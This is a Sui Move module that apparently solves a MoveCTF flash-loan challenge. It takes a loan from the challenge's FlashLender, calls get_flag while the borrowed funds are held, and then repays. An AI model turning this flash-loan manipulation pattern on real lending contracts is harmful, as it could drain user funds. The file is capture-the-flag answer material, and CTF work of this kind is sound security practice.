module flashloan_solution::solution {
  use sui::tx_context::{TxContext};
  use movectf::flash::{Self, create_lend, repay, check, balance, deposit, withdraw, FlashLender};

  public entry fun get_flag(lender: &mut FlashLender, ctx: &mut TxContext) {
    let (loan, receipt) = flash::loan(lender, 1000, ctx);
    flash::get_flag(lender, ctx);
    repay(lender, loan);
    check(lender, receipt);
  }
}
